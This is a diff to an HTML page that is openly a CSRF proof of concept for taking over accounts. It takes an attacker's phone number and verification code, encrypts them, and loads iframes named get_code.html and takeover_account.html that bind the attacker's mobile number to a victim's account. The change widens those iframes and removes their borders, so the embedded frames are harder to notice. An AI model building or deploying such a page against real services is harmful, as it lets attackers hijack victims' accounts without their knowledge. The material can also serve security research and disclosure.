@@ -59,12 +59,12 @@ Your phone number for account takeover(pattern:+86XXXXXXX): <input type="text" n
 <input type="submit" value="Encryped!" onclick="mobileEncrypted()"/>
 <textarea id="encryptedmobile" width="100" height="20"></textarea>
 <h3>Step 1--Using CSRF vulnerability to get the verify code from attacker mobile on victim account</h3>
-<iframe src=get_code.html width="300" height="200"></iframe>
+<iframe src=get_code.html width="500" height="200" frameborder=”no” border=”0″></iframe>
 <h3>Step 2--Input the verify code from attacker mobile then encrypted</h3>
 Your verify code from attacker mobile: <input type="text" name="attackercode" id="attackercodeid">
 <input type="submit" value="Encryped!" onclick="codeEncrypted()"/>
 <textarea id="encryptedcode" width="100" height="20"></textarea>
 <h3>Step 3--Input the encrpted mobile number and verify code from attacker and click the botton then the attacker mobile will blind on victim account</h3>
-<iframe src=takeover_account.html width="300" height="200"></iframe>
+<iframe src=takeover_account.html width="500" height="200" frameborder=”no” border=”0″></iframe>
 </body>
 </html>
